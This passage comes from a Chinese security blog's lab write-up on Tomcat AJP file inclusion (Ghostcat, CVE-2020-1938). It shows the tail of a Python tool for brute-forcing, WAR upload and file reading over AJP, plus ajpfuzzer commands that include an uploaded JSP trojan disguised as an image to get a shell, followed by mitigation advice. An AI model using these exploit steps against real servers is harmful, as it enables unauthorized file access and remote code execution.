Tomcat(args.target, args.port)</span><br><span class="line">	<span class="keyword">if</span> args.which == <span class="string">&#x27;bf&#x27;</span>:</span><br><span class="line">		bf.start_bruteforce(args.users, args.passwords, args.req_uri, args.stop)</span><br><span class="line"><span class="comment">#	elif args.which == &#x27;req&#x27;:</span></span><br><span class="line"><span class="comment">#		print bf.perform_request(args.req_uri, args.headers, args.method, args.user, args.password)</span></span><br><span class="line">	<span class="keyword">elif</span> args.which == <span class="string">&#x27;upload&#x27;</span>:</span><br><span class="line">		bf.upload(args.filename, args.user, args.password, args.old_version, args.headers)</span><br><span class="line">	<span class="keyword">elif</span> args.which == <span class="string">&#x27;version&#x27;</span>:</span><br><span class="line">		<span class="built_in">print</span>(bf.get_version())</span><br><span class="line">	<span class="keyword">elif</span> args.which == <span class="string">&#x27;list&#x27;</span>:</span><br><span class="line">		apps = bf.list_installed_applications(args.user, args.password, args.old_version, args.headers)</span><br><span class="line">		logger.info(<span class="string">&quot;Installed applications:&quot;</span>)</span><br><span class="line">		<span class="keyword">for</span> app <span class="keyword">in</span> apps:</span><br><span class="line">			logger.info(<span class="string">&#x27;- &#x27;</span> + app)</span><br><span class="line">	<span class="keyword">elif</span> args.which == <span class="string">&#x27;undeploy&#x27;</span>:</span><br><span class="line">		bf.undeploy(args.path, args.user, args.password, args.old_version, args.headers)</span><br><span class="line">	<span class="keyword">elif</span> args.which == <span class="string">&#x27;read_file&#x27;</span>:</span><br><span class="line">		attributes = [</span><br><span class="line">			&#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;req_attribute&quot;</span>, <span class="string">&quot;value&quot;</span>: (<span class="string">&quot;javax.servlet.include.request_uri&quot;</span>, <span class="string">&quot;/&quot;</span>,)&#125;,</span><br><span class="line">			&#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;req_attribute&quot;</span>, <span class="string">&quot;value&quot;</span>: (<span class="string">&quot;javax.servlet.include.path_info&quot;</span>, args.file_path,)&#125;,</span><br><span class="line">			&#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;req_attribute&quot;</span>, <span class="string">&quot;value&quot;</span>: (<span class="string">&quot;javax.servlet.include.servlet_path&quot;</span>, <span class="string">&quot;/&quot;</span>,)&#125;,</span><br><span class="line">		]</span><br><span class="line">		hdrs, data = bf.perform_request(<span class="string">&quot;/&quot;</span> + args.webapp + <span class="string">&quot;/xxxxx.jsp&quot;</span>, attributes=attributes)</span><br><span class="line">		output = sys.stdout</span><br><span class="line">		<span class="keyword">if</span> args.output:</span><br><span class="line">			output = <span class="built_in">open</span>(args.output, <span class="string">&quot;wb&quot;</span>)</span><br><span class="line">		<span class="keyword">for</span> d <span class="keyword">in</span> data:</span><br><span class="line">			<span class="keyword">if</span> args.output:</span><br><span class="line">				output.write(d.data)</span><br><span class="line">			<span class="keyword">else</span>:</span><br><span class="line">				<span class="keyword">try</span>:</span><br><span class="line">				    output.write(d.data.decode(<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line">				<span class="keyword">except</span> UnicodeDecodeError:</span><br><span class="line">				    output.write(<span class="built_in">repr</span>(d.data))</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> args.output:</span><br><span class="line">			output.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="0b110-getshell-三"><a href="#0b110-getshell-三" class="headerlink" title="0b110 getshell(三)"></a>0b110 getshell(三)</h3><ul><li>下载 AJP 包构造器 ajpfuzzer ：<code>wget https://github.com/doyensec/ajpfuzzer/releases/download/v0.6/ajpfuzzer_v0.6.jar</code></li><li>运行 ajpfuzzer：<code>java -jar ajpfuzzer_v0.6.jar</code></li><li>连接目标靶机端口：<code>connect 106.15.50.112 18009</code></li><li>执行如下命令构造并发送AJP包，其中<code>/upload/2022-000047-000027.jpg</code>为木马路径，其中<code>/whalwl/11.jsp</code>可以换为该web项目下任意目录中没有的jsp文件，如此tomcat才会去调用DefaultServlet<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">forwardrequest <span class="number">2</span> <span class="string">&quot;HTTP/1.1&quot;</span> <span class="string">&quot;/whalwl/11.jsp&quot;</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> porto <span class="number">8009</span> false <span class="string">&quot;Cookie:AAAA=BBBB&quot;</span>,<span class="string">&quot;Accept-Encoding:identity&quot;</span> <span class="string">&quot;javax.servlet.include.request_uri:11.jsp&quot;</span>,<span class="string">&quot;javax.servlet.include.path_info:/upload/2022-000047-000027.jpg&quot;</span>,<span class="string">&quot;javax.servlet.include.servlet_path:/&quot;</span></span><br></pre></td></tr></table></figure></li></ul><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/0xtlu/blogsPicture@main/20220828/tumeiimage.725zb7wlzo00.jpg?raw=true" alt="tumeiimage"></p><h3 id="0b111参考文档"><a href="#0b111参考文档" class="headerlink" title="0b111参考文档"></a>0b111参考文档</h3><ul><li>参考1：<a class="link" target="_blank" rel="noopener" href="https://www.jianshu.com/p/440bc2662fc3">https://www.jianshu.com/p/440bc2662fc3<i class="fas fa-external-link-alt"></i></a></li><li>参考4：<a class="link" target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzUyNDk0MDQ3OQ==&amp;mid=2247485009&amp;idx=1&amp;sn=5f619c27ec994949f5fa69d41d2dee05&amp;chksm=fa24e381cd536a972db2cc5a5fc09be33a7833f1caa6440bb5979d3d7ea052384645fbd2b62c&amp;mpshare=1&amp;scene=23&amp;srcid=&amp;sharer_sharetime=1584439554350&amp;sharer_shareid=1f92b9e8670fffeb7eea157894e3536a#rd">https://mp.weixin.qq.com/s?__biz=MzUyNDk0MDQ3OQ==&amp;mid=2247485009&amp;idx=1&amp;sn=5f619c27ec994949f5fa69d41d2dee05&amp;chksm=fa24e381cd536a972db2cc5a5fc09be33a7833f1caa6440bb5979d3d7ea052384645fbd2b62c&amp;mpshare=1&amp;scene=23&amp;srcid=&amp;sharer_sharetime=1584439554350&amp;sharer_shareid=1f92b9e8670fffeb7eea157894e3536a#rd<i class="fas fa-external-link-alt"></i></a></li><li>参考6：<a class="link" target="_blank" rel="noopener" href="https://zhzhdoai.github.io/2020/02/26/Tomcat-Ajp%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%88%A9%E7%94%A8-CVE-2020-1938/">https://zhzhdoai.github.io/2020/02/26/Tomcat-Ajp%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%88%A9%E7%94%A8-CVE-2020-1938/<i class="fas fa-external-link-alt"></i></a></li><li>参考8：<a class="link" target="_blank" rel="noopener" href="https://blog.csdn.net/Kris__zhang/article/details/106232024">https://blog.csdn.net/Kris__zhang&#x2F;article&#x2F;details&#x2F;106232024<i class="fas fa-external-link-alt"></i></a></li></ul><h2 id="0o02-CVE-2020-1938"><a href="#0o02-CVE-2020-1938" class="headerlink" title="0o02 CVE-2020-1938"></a>0o02 CVE-2020-1938</h2><ul><li>漏洞概述：2020年2月20日，国家信息安全漏洞共享平台（CNVD）发布关于Apache Tomcat的安全公告，Apache Tomcat文件包含漏洞（CNVD-2020-10487，对应CVE-2020-1938）。Tomcat AJP协议由于存在实现缺陷导致相关参数可控，攻击者利用该漏洞可通过构造特定参数，读取服务器 <code>webapp</code> 下的任意文件，如 <code>WEB-INF/web.xml</code>。若服务器端同时存在文件上传功能，攻击者可进一步实现远程代码的执行。</li><li>影响版本：Tomcat 6.x，7.x &lt; 7.0.100，8.x &lt;8.5.51，9.x &lt; 9.0.31。</li><li>漏洞防护：① 更新至最新版本；② 禁用 AJP 协议，注释或删除 <code>/conf/server.xml</code> 的 <code>&lt;Connectorport=&quot;8009&quot; protocol=&quot;AJP/1.3&quot;redirectPort=&quot;8443&quot; /&gt;</code> ；③ 配置 secret 以设置 AJP 协议的认证凭证，如 <code>&lt;Connector port=&quot;8009&quot;protocol=&quot;AJP/1.3&quot; redirectPort=&quot;8443&quot;address=&quot;YOUR_TOMCAT_IP_ADDRESS&quot; secret=&quot;YOUR_TOMCAT_AJP_SECRET&quot;/&gt;</code>。注：<code>YOUR_TOMCAT_AJP_SECRET</code> 需设置更难猜解。</li><li>漏洞解析：<a class="link" target="_blank" rel="noopener" href="https://weread.qq.com/web/reader/c8732a70726fa058c87154bk76d325c028076dc611d6d8c">https://weread.qq.com/web/reader/c8732a70726fa058c87154bk76d325c028076dc611d6d8c<i class="fas fa-external-link-alt"></i></a></li><li>参考文章：<a class="link" target="_blank" rel="noopener" href="https://www.chaitin.cn/zh/ghostcat">https://www.chaitin.cn/zh/ghostcat<i class="fas fa-external-link-alt"></i></a></li></ul></div><div class="post-copyright-info"><div class="article-copyright-info-container"><ul class="copyright-info-content"><li><span class="type">本文标题</span>：<span class="content">安鸾之中间件系列</span></li><li><span class="type">本文作者</span>：<span class="content">涂寐</span></li><li><span class="type">创建时间</span>：<span class="content">2022-08-28 01:28:23</span></li><li class="post-link"><span class="type">本文链接</span>：<span class="content">article/c199ed5c.html</span></li><li><span class="type">版权声明</span>：<span class="content">本博客所有文章除特别声明外，均采用 <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">BY-NC-SA</a> 许可协议。转载请注明出处！</span></li></ul></div></div><ul class="post-tags-box"><li class="tag-item"><a href="/tags/whalwl/">#安鸾</a>&nbsp;</li><li class="tag-item"><a href="/tags/middleware/">#中间件</a>&nbsp;</li></ul><div class="article-nav"><div class="article-prev"><a class="prev" rel="prev" href="/article/75df7cb4.html"><span class="left arrow-icon flex-center"><i class="fas fa-chevron-left"></i> </span><span class="title flex-center"><span class="post-nav-title-item">2022小雪补记</span> <span class="post-nav-item">上一篇</span></span></a></div><div class="article-next"><a class="next" rel="next" href="/article/9a765bc7.html"><span class="title flex-center"><span class="post-nav-title-item">安鸾之RCE系列</span> <span class="post-nav-item">下一篇</span> </span><span class="right arrow-icon flex-center"><i class="fas fa-chevron-right"></i></span></a></div></div><div class="comment-container"><div class="comments-container"><div id="comments-anchor"></div><div class="comment-area-title"><i class="fas fa-comments"></i>&nbsp;评论</div><div class="valine-container"><script data-pjax src="//cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js"></script><div id="vcomments"></div><script data-pjax>function loadValine(){function e(e){switch(e){case"en":return"Author";case"zh-CN":return"博主";default:return"Master"}}new Valine({el:"#vcomments",appId:"FrcGiaBdfMQqXAnDFY1gwHbS-gzGzoHsz",appKey:"C0Wy6Sfq0qVag0nm59fc1D12",meta:["nick","mail","link"],avatar:"wavatar",enableQQ:!0,placeholder:"道友，请留步！请留言~",lang:"zh-CN".toLowerCase()});const a=setInterval(()=>{const n=document.querySelectorAll("#vcomments .vcards .vcard");if(n.length>0){let t="涂寐";if(t)for(let a of n){const n=a.querySelector(".vhead .vnick"),l=n.innerHTML;l===t&&(n.innerHTML=`${l} <span class="author">${e(KEEP.hexo_config.language)}</span>`)}clearInterval(a)}else clearInterval(a)},2e3)}{const e=setTimeout(()=>{loadValine(),clearTimeout(e)},1e3)}</script></div></div></div></div><div class="toc-content-container"><div class="post-toc-wrap"><div class="post-toc"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x00-tomcat8%E5%BC%B1%E5%8F%A3%E4%BB%A4"><span class="nav-number">1.</span> <span class="nav-text">0x00 tomcat8弱口令</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0o00-%E9%A2%98%E7%9B%AE%E6%8F%90%E7%A4%BA"><span class="nav-number">1.1.</span> <span class="nav-text">0o00 题目提示</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0o01-%E6%B5%8B%E8%AF%95%E8%BF%87%E7%A8%8B"><span class="nav-number">1.2.</span> <span class="nav-text">0o01 测试过程</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0o02-Tomcat-%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84"><span class="nav-number">1.3.</span> <span class="nav-text">0o02 Tomcat 目录结构</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01-Weblogic%E5%BC%B1%E5%8F%A3%E4%BB%A4-amp-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">2.</span> <span class="nav-text">0x01 Weblogic弱口令&amp;反序列化</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0o00-%E9%A2%98%E7%9B%AE%E6%8F%90%E7%A4%BA-1"><span class="nav-number">2.1.</span> <span class="nav-text">0o00 题目提示</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0o01-%E6%B5%8B%E8%AF%95%E8%BF%87%E7%A8%8B-1"><span class="nav-number">2.2.</span> <span class="nav-text">0o01 测试过程</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0b00-%E6%8E%A7%E5%88%B6%E5%8F%B0%E5%BC%B1%E5%8F%A3%E4%BB%A4"><span class="nav-number">2.2.1.</span> <span class="nav-text">0b00 控制台弱口令</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0b01-CVE-2017-10271"><span class="nav-number">2.2.2.</span> <span class="nav-text">0b01 CVE-2017-10271</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02-tomcat%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5"><span class="nav-number">3.</span> <span class="nav-text">0x02 tomcat任意文件写入</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0o00-%E9%A2%98%E7%9B%AE%E6%8F%90%E7%A4%BA-2"><span class="nav-number">3.1.</span> <span class="nav-text">0o00 题目提示</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0o01-%E6%B5%8B%E8%AF%95%E8%BF%87%E7%A8%8B-2"><span class="nav-number">3.2.</span> <span class="nav-text">0o01 测试过程</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0b00-%E6%89%8B%E5%B7%A5%E6%B5%8B%E8%AF%95"><span class="nav-number">3.2.1.</span> <span class="nav-text">0b00 手工测试</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0b01-%E7%BA%B8%E6%9C%BA%E5%A4%A7%E4%BD%AC%E8%84%9A%E6%9C%AC"><span class="nav-number">3.2.2.</span> <span class="nav-text">0b01 纸机大佬脚本</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0b10%E5%85%B6%E4%BB%96%E5%A4%A7%E4%BD%AC%E8%84%9A%E6%9C%AC"><span class="nav-number">3.2.3.</span> <span class="nav-text">0b10其他大佬脚本</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0o02-CVE-2017-12615"><span class="nav-number">3.3.</span> <span class="nav-text">0o02 CVE-2017-12615</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x03-Apache-Tomcat-AJP-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E"><span class="nav-number">4.</span> <span class="nav-text">0x03 Apache Tomcat AJP 文件包含漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0o00-%E9%A2%98%E7%9B%AE%E6%8F%90%E7%A4%BA-3"><span class="nav-number">4.1.</span> <span class="nav-text">0o00 题目提示</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0o01-%E6%B5%8B%E8%AF%95%E8%BF%87%E7%A8%8B-3"><span class="nav-number">4.2.</span> <span class="nav-text">0o01 测试过程</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0b000-%E7%89%88%E6%9C%AC%E6%8E%A2%E6%B5%8B"><span class="nav-number">4.2.1.</span> <span class="nav-text">0b000 版本探测</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0b001-%E8%84%9A%E6%9C%AC%E6%B5%8B%E8%AF%95"><span class="nav-number">4.2.2.</span> <span class="nav-text">0b001 脚本测试</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0b010-%E7%9B%AE%E5%BD%95%E8%AF%B4%E6%98%8E"><span class="nav-number">4.2.3.</span> <span class="nav-text">0b010 目录说明</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0b011-%E8%B7%A8%E7%9B%AE%E5%BD%95%E9%97%AE%E9%A2%98"><span class="nav-number">4.2.4.</span> <span class="nav-text">0b011 跨目录问题</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0b100-getshell-%E4%B8%80"><span class="nav-number">4.2.5.</span> <span class="nav-text">0b100 getshell(一)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0b101-getshell-%E4%BA%8C"><span class="nav-number">4.2.6.</span> <span class="nav-text">0b101 getshell(二)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0b110-getshell-%E4%B8%89"><span class="nav-number">4.2.7.</span> <span class="nav-text">0b110 getshell(三)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0b111%E5%8F%82%E8%80%83%E6%96%87%E6%A1%A3"><span class="nav-number">4.2.8.</span> <span class="nav-text">0b111参考文档</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0o02-CVE-2020-1938"><span class="nav-number">4.3.</span> <span class="nav-text">0o02 CVE-2020-1938</span></a></li></ol></li></ol></div></div></div></div></div></div></div><div class="page-main-content-bottom"><footer class="footer"><div class="info-container"><div class="copyright-info info-item">&copy; <span>2021</span> - 2023 &nbsp;<i class="fas fa-heart icon-animate" style="color:red"></i> &nbsp;<a href="/">涂寐</a></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div class="website-count info-item"></div><div class="theme-info info-item">由 <a target="_blank" href="https://hexo.io">Hexo</a> 驱动&nbsp;|&nbsp;主题&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.5.2</a></div><script id="LA-DATA-WIDGET" crossorigin="anonymous" charset="UTF-8" src="https://v6-widget.51.la/v6/JiZItHVhLKBShkL0/quote.js?theme=#1690FF,#333333,#999999,#333333,#FFFFFF,#1690FF,18&f=18&display=0,0,1,1,0,1,1,1"></script></div></footer></div></div><div class="post-tools"><div class="post-tools-container"><ul class="tools-list"><li class="tools-item flex-center toggle-show-toc"><i class="fas fa-list"></i></li><li class="tools-item flex-center go-to-comments"><i class="fas fa-comment"></i> <span class="post-comments-count"></span></li></ul></div></div><div class="right-bottom-side-tools"><div class="side-tools-container"><ul class="side-tools-list"><li class="tools-item tool-font-adjust-plus flex-center"><i class="fas fa-search-plus"></i></li><li class="tools-item tool-font-adjust-minus flex-center"><i class="fas fa-search-minus"></i></li><li class="tools-item tool-dark-light-toggle flex-center"><i class="fas fa-moon"></i></li><li class="tools-item tool-scroll-to-bottom flex-center"><i class="fas fa-arrow-down"></i></li></ul><ul class="exposed-tools-list"><li class="tools-item tool-toggle-show flex-center"><i class="fas fa-cog fa-spin"></i></li><li class="tools-item tool-scroll-to-top flex-center"><i class="arrow-up fas fa-arrow-up"></i> <span class="percent"></span></li></ul></div></div><div class="zoom-in-image-mask"><img class="zoom-in-image"></div><div class="search-pop-overlay"><div class="popup search-popup"><div class="search-header"><span class="search-input-field-pre"><i class="fas fa-keyboard"></i></span><div class="search-input-container"><input autocomplete="off" autocorrect="off" autocapitalize="off" placeholder="搜索..." spellcheck="false" type="search" class="search-input"></div><span class="close-popup-btn"><i class="fas fa-times"></i></span></div><div id="search-result"><div id="no-result"><i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i></div></div></div></div></main><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.5.2/source/js/utils.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.5.2/source/js/main.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.5.2/source/js/header-shrink.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.5.2/source/js/back2top.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.5.2/source/js/dark-light-toggle.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.5.2/source/js/local-search.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.5.2/source/js/code-block.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.5.2/source/js/lazyload.js"></script><div class="post-scripts pjax"><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.5.2/source/js/post-helper.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.5.2/source/js/libs/anime.min.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.5.2/source/js/toc.js"></script></div><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.5.2/source/js/libs/pjax.min.js"></script><script>window.addEventListener("DOMContentLoaded",()=>{window.pjax=new Pjax({selectors:["head title",".page-container",".pjax"],history:!0,debug:!1,cacheBust:!1,timeout:0,analytics:!1,currentUrlFullReload:!1,scrollRestoration:!1}),document.addEventListener("pjax:send",()=>{KEEP.utils.pjaxProgressBarStart()}),document.addEventListener("pjax:complete",()=>{KEEP.utils.pjaxProgressBarEnd(),window.pjax.executeScripts(document.querySelectorAll("script[data-pjax], .pjax script")),KEEP.refresh()})})</script></body></html>